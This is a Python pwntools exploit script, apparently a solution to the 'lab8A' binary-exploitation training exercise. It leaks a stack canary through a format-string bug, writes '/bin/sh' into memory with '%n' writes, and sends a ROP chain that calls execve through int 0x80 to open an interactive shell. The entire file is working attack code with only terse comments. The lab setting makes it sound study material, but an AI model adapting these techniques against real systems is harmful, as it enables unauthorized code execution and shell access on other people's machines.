#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386',kernel='amd64')
context.log_level = "DEBUG"
context.terminal = ["tmux","splitw","-h"]
exe = './lab8A'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
#break *selectABook+9
break *selectABook+51
#break *findSomeWords+6
#break *findSomeWords+80
break *findSomeWords+139
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()
io.recv()

#Leak stack canary
io.sendline("%130$x")
canary = p32(int(io.recv()[0:8],16))

#2f62696e - /bin
#>>> 0x696e
#26990

#2f2f7368 - //sh

#Write '/bin/sh' to .bss address 0x080ecf80
io.sendline("\x80\xcf\x0e\x08%25131x%2$n")
io.recv()
io.sendline("\x82\xcf\x0e\x08%28261x%2$n")
io.recv()
io.sendline("\x84\xcf\x0e\x08%12075x%2$n")
io.recv()
io.sendline("\x86\xcf\x0e\x08%26735x%2$n")
io.recv()

rop = ROP(ELF(exe))
#0x080a7acd : xor edx, edx ; add esp, 0x5c ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret

rop.raw(p32(0x080bc506)) #0x080bc506 : pop eax ; ret
rop.raw(0xb) #EAX = 11
rop.raw(p32(0x080481c9)) #: pop ebx ; ret   )
rop.raw(p32(0x080ecf80))

rop.raw(p32(0x080e71c5)) # : pop ecx ; ret)
rop.raw(0x0)
rop.raw(p32(0x0806f22a)) #: pop edx ; ret)
rop.raw(0x0)
rop.raw(p32(0x0806f8ff)) #0x0806f8ff : nop ; int 0x80

io.sendline("A")
io.recvuntil("I like to read ^_^")
io.sendline(fit({16:0xdeadbeef,24:canary,32:rop.chain()},length=1000))

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)
io.interactive()

